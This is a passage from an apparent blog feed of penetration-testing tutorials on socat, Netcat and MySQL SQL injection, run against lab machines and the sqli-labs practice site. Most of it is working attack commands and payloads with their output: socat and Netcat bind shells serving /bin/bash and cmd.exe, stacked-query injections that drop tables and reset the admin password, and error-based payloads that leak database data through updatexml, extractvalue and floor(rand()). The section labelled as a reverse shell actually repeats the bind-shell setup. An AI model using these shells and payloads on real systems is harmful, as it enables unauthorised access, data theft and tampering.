class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#x27;.&#x27;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:CA</span><br><span class="line">State or Province Name (full name) [Some-State]:Quebec</span><br><span class="line">Locality Name (eg, city) []:Montreal</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:Raohua</span><br><span class="line">Organizational Unit Name (eg, section) []:Try Harder Department</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:</span><br><span class="line">Email Address []:</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# cat bind_shell.key bind_shell.crt &gt; bind_shell.pem</span><br><span class="line">                                                                                                                                                            </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# socat OPENSSL-LISTEN:443,cert=bind_shell.pem,verify=0,fork EXEC:/bin/bash </span><br></pre></td></tr></table></figure><p>Client side:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\socat&gt; socat - OPENSSL:192.168.244.140:443,verify=0</span><br><span class="line">id</span><br><span class="line">uid=0(root) gid=0(root) 0=1000(root)</span><br><span class="line">whoami</span><br><span class="line">root</span><br><span class="line">ip addr</span><br><span class="line">1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000</span><br><span class="line">    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00</span><br><span class="line">    inet 127.0.0.1/8 scope host lo</span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">    inet6 ::1/128 scope host </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc fq_codel state UP group default qlen 1000</span><br><span class="line">    link/ether 00:0c:29:f9:b4:b9 brd ff:ff:ff:ff:ff:ff</span><br><span class="line">    inet 192.168.244.140/24 brd 192.168.244.255 scope global dynamic noprefixroute eth0</span><br><span class="line">       valid_lft 1168sec preferred_lft 1168sec</span><br><span class="line">    inet6 fe80::9d6e:bd4e:a4b2:6ffb/64 scope link noprefixroute </span><br><span class="line">       valid_lft forever preferred_lft forever</span><br><span class="line">3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default </span><br><span class="line">    link/ether 02:42:1d:28:b9:62 brd ff:ff:ff:ff:ff:ff</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Socat is a command-line utility that establishes two bidirectional byte streams and transfers data&lt;br&gt;between them. For penetration testi</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="Practical Tools" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/"/>
    
    <category term="Socat" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/Socat/"/>
    
    
  </entry>
  
  <entry>
    <title>Netcat</title>
    <link href="http://example.com/2016/12/01/Pentest-nc/"/>
    <id>http://example.com/2016/12/01/Pentest-nc/</id>
    <published>2016-12-02T04:04:37.000Z</published>
    <updated>2023-10-21T22:00:01.691Z</updated>
    
    <content type="html"><![CDATA[<p>Netcat first released in 1995(!) by <em>Hobbit</em> is one of the “original” network penetration testing<br>tools and is so versatile that it lives up to the author’s designation as a hacker’s “Swiss army knife”.<br>The clearest definition of Netcat is from <em>Hobbit</em> himself: a simple “utility which reads and writes<br>data across network connections, using TCP or UDP protocols.</p><ol><li>Connecting to a TCP&#x2F;UDP Port</li></ol><p>We can use client mode to connect to any TCP&#x2F;UDP port, allowing us to:<br>• Check if a port is open or closed.<br>• Read a banner from the service listening on a port.<br>• Connect to a network service manually.</p><p>Example:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -nv 10.11.10.2 110</span><br></pre></td></tr></table></figure><p><code>-n</code> option to skip DNS name resolution;<br><code>-v</code> to add some verbosity;</p><p>Output:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(UNKNOWN) [10.11.10.2] 110 (pop3) open</span><br><span class="line">+OK Dovecot ready.</span><br><span class="line">USER offsec</span><br><span class="line">+OK</span><br><span class="line">PASS offsec</span><br><span class="line">-ERR [AUTH] Authentication failed.</span><br><span class="line">quit</span><br><span class="line">+OK Logging out</span><br></pre></td></tr></table></figure><ol start="2"><li>Listening on a TCP&#x2F;UDP Port</li></ol><p>Example:</p><p>First , server start listening: </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">msfadmin@metasploitable:~$ nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>Then client try to connect server,and send “hello world”: </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//From client : </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.136 4444</span><br><span class="line">(UNKNOWN) [192.168.244.136] 4444 (?) open</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><p>The server will receive message “hello world”:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">msfadmin@metasploitable:~$ nc -nlvp 4444</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 47386</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure><ol start="3"><li>Transferring Files with Netcat</li></ol><p>From Server:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">//From server : </span><br><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 &gt; mync.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>From client : </p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">//From client : </span><br><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444 &lt; /home/kali/Desktop/nc.exe     </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br></pre></td></tr></table></figure><p>Notice that we have not received any feedback from Netcat about our file upload progress. In this<br>case, since the file we are uploading is small, we can just wait a few seconds, then check whether<br>the file has been fully uploaded to the Windows machine by attempting to run it:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt;mync -h</span><br><span class="line">[v1.10-47]</span><br><span class="line">connect to somewhere:   nc [-options] hostname port[s] [ports] ... </span><br><span class="line">listen for inbound:     nc -l -p port [-options] [hostname] [port]</span><br><span class="line">options:</span><br><span class="line">        -c shell commands       as `-e&#x27;; use /bin/sh to exec [dangerous!!]</span><br><span class="line">        -e filename             program to exec after connect [dangerous!!]</span><br><span class="line">        -b                      allow broadcasts</span><br><span class="line">        ...</span><br><span class="line">port numbers can be individual or ranges: lo-hi [inclusive];</span><br><span class="line">hyphens in port names must be backslash escaped (e.g. &#x27;ftp\-data&#x27;).</span><br></pre></td></tr></table></figure><ol start="4"><li>Netcat Bind Shell Scenario</li></ol><p>Run Netcat with the -e option to execute cmd.exe once a connection is made to the listening port:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure><p>Client:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444                            </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br><span class="line">Microsoft Windows [Version 6.1.7601]</span><br><span class="line">Copyright (c) 2009 Microsoft Corporation.  All rights reserved.</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\netcat-1.11&gt;ipconfig</span><br><span class="line">ipconfig</span><br><span class="line"></span><br><span class="line">Windows IP Configuration</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Ethernet adapter Local Area Connection:</span><br><span class="line"></span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line">   Link-local IPv6 Address . . . . . : fe80::6d45:b51c:b367:2f09%11</span><br><span class="line">   IPv4 Address. . . . . . . . . . . : 192.168.244.143</span><br><span class="line">   Subnet Mask . . . . . . . . . . . : 255.255.255.0</span><br><span class="line">   Default Gateway . . . . . . . . . : 192.168.244.2</span><br><span class="line"></span><br><span class="line">Tunnel adapter isatap.localdomain:</span><br><span class="line"></span><br><span class="line">   Media State . . . . . . . . . . . : Media disconnected</span><br><span class="line">   Connection-specific DNS Suffix  . : localdomain</span><br><span class="line"></span><br><span class="line">C:\Users\Administrator\Desktop\netcat-1.11&gt;</span><br></pre></td></tr></table></figure><p>This is indeed a “gaping security hole”!</p><ol start="5"><li>Reverse Shell Scenario<br>Server:<figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br></pre></td></tr></table></figure></li></ol><p>Client:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[/home/kali/Desktop]</span><br><span class="line">└─# nc -nv 192.168.244.143 4444                            </span><br><span class="line">(UNKNOWN) [192.168.244.143] 4444 (?) open</span><br></pre></td></tr></table></figure><p>Then server side shows like:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Administrator\Desktop\nc&gt; nc -nlvp 4444 -e cmd.exe</span><br><span class="line">listening on [any] 4444 ...</span><br><span class="line">connect to [192.168.244.136] from (UNKNOWN) [192.168.244.140] 35156</span><br><span class="line">ls</span><br><span class="line">code.desktop</span><br><span class="line">nc.exe</span><br><span class="line"></span><br><span class="line">ip address show eth0 | grep inet</span><br><span class="line">inet 10.11.0.4/16 brd 10.11.255.255 scope global dynamic eth0</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;Netcat first released in 1995(!) by &lt;em&gt;Hobbit&lt;/em&gt; is one of the “original” network penetration testing&lt;br&gt;tools and is so versatile tha</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="Practical Tools" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/"/>
    
    <category term="Netcat" scheme="http://example.com/categories/Penetration-Test/Practical-Tools/Netcat/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL Stack-Based SQL Injection</title>
    <link href="http://example.com/2016/11/29/SQLInjectionMySQLStackBased/"/>
    <id>http://example.com/2016/11/29/SQLInjectionMySQLStackBased/</id>
    <published>2016-11-30T04:22:05.000Z</published>
    <updated>2023-10-19T15:36:07.842Z</updated>
    
    <content type="html"><![CDATA[<p>In SQL, a semicolon represents the end of one SQL statement, while stack-based injection involves executing multiple SQL statements together. Stack-based injection is different from other injection techniques and has limitations.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%27 --- <span class="string">&#x27;</span></span><br><span class="line"><span class="string">%20 --- space</span></span><br></pre></td></tr></table></figure><p>How can you find the table fields and table names of the other party?</p><ol><li>Look for exploitable files using directory traversal vulnerabilities, such as files with a .sql extension.</li><li>Use directory&#x2F;file fuzzing tools like Dirsearch, etc., to search for .sql files.</li><li>Search for source code leakage vulnerabilities on the other party’s website; the source code may contain exploitable files.</li><li>Search for the other party’s website source code on GitHub.</li></ol><p>Example:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;    //You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line 1   </span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;   // it&#x27;</span>s ok</span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;create table aa like users;    //create a table named aa, structure like table users</span></span><br><span class="line"><span class="string">http://192.168.1.33/sqli-labs-master/Less-38/?id=1&#x27;</span>;drop table aa--+</span><br><span class="line">http://192.168.1.33/sqli-labs-master/Less-38/?<span class="built_in">id</span>=1<span class="string">&#x27;;update users  set password =&#x27;</span>admin@1234<span class="string">&#x27; where username=&#x27;</span>admin<span class="string">&#x27;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;In SQL, a semicolon represents the end of one SQL statement, while stack-based injection involves executing multiple SQL statements toget</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="MySQL Stack-Based SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Stack-Based-SQL-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>HTTP Header SQL Injection</title>
    <link href="http://example.com/2016/11/25/SQLInjectionHttpHeader/"/>
    <id>http://example.com/2016/11/25/SQLInjectionHttpHeader/</id>
    <published>2016-11-26T02:11:31.000Z</published>
    <updated>2023-10-19T15:20:17.106Z</updated>
    
    <content type="html"><![CDATA[<p> HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. This can have various security implications, including the potential for cross-site scripting (XSS) attacks or other forms of web application exploitation.</p><p> Example :<br> <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /sqli-labs-master/Less-18/ HTTP/1.1</span><br><span class="line">Host: 192.168.1.33</span><br><span class="line">Content-Length: 38</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.1.33</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent:1<span class="string">&#x27; and updatexml(1,concat(0x7e,(user()),0x7e),1) and &#x27;</span>1<span class="string">&#x27;=&#x27;</span>1</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.1.33/sqli-labs-master/Less-18/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line"><span class="built_in">uname</span>=admin&amp;passwd=admin&amp;submit=Submit   </span><br><span class="line"></span><br></pre></td></tr></table></figure><br>  <figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~root@localhost~&#x27;</span><br></pre></td></tr></table></figure></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt; HTTP header injection is a security vulnerability that occurs when an attacker is able to inject malicious content into HTTP headers. Th</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="HTTP Header SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/HTTP-Header-SQL-Injection/"/>
    
    
  </entry>
  
  <entry>
    <title>MySQL Error-Based SQL Injection</title>
    <link href="http://example.com/2016/11/22/SQLInjectionMySQLError/"/>
    <id>http://example.com/2016/11/22/SQLInjectionMySQLError/</id>
    <published>2016-11-23T01:55:15.000Z</published>
    <updated>2023-10-19T15:20:20.371Z</updated>
    
    <content type="html"><![CDATA[<ol><li>Overview</li></ol><p>Error-Based Injection involves deliberately triggering error conditions in the database to make query results appear in error messages. This technique is particularly useful in cases where UNION-based injections are restricted and error information can be returned. It’s also known as Formulaic SQL Injection.</p><ol start="2"><li>Utilizing the updatexml() function:</li></ol><p>Payload:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (updatexml(1,concat(0x7e,(select user()),0x7e),1));--+</span><br></pre></td></tr></table></figure><p><code>0x7e</code>: ~<br><code>updatexml()</code>: Function used to update XML documents.<br><code>updatexml()</code> syntax: update(target_xml_document, xpath_expression, new_value)<br>XPath expressions are used to specify paths within an XML document. If the format is incorrect, an error will occur.</p><p>Subsequent steps for updatexml-based error-based injection:</p><p>(1). Modify the SQL statement for selecting the user position.<br>(2). Retrieve tables in the current database.<br>(3). Retrieve columns of a specific table.<br>(4). Continue step by step.</p><ol start="3"><li>Utilizing the extravalue() function:</li></ol><p>Payload:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (extravalue(1,concat(0x7e,(select user()),0x7e)))--+</span><br></pre></td></tr></table></figure><p><code>extravalue()</code> function is similar to updatexml() and is used for querying node content in an XML document.<br>Subsequent steps for extravalue-based error-based injection are the same as for updatexml.</p><ol start="4"><li>Utilizing the floor() function:</li></ol><p>Payload:</p><figure class="highlight console"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)--+</span><br></pre></td></tr></table></figure><p>The principle utilized is the repetition of primary keys due to the repetitiveness of <code>floor(rand(0)*2)</code>, leading to an error in the group by statement.<br>The group by key principle involves looping through every row of data and saving the results in a temporary table. When reading each row’s key, if the key exists in the temporary table, it won’t update the temporary table’s data. If the key doesn’t exist, it will insert the key’s row data into the temporary table.</p><ol start="5"><li>Additional Information:</li></ol><p>These three functions are commonly used in error-based injections.</p>]]></content>
    
    
      
      
    <summary type="html">&lt;ol&gt;
&lt;li&gt;Overview&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;Error-Based Injection involves deliberately triggering error conditions in the database to make query result</summary>
      
    
    
    
    <category term="Penetration Test" scheme="http://example.com/categories/Penetration-Test/"/>
    
    <category term="MySQL" scheme="http://example.com/categories/Penetration-Test/MySQL/"/>
    
    <category term="SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/"/>
    
    <category term="MySQL Error-Based SQL Injection" scheme="http://example.com/categories/Penetration-Test/MySQL/SQL-Injection/MySQL-Error-Based-SQL-Injection/"/>
    
    
  </entry>
  
</feed>
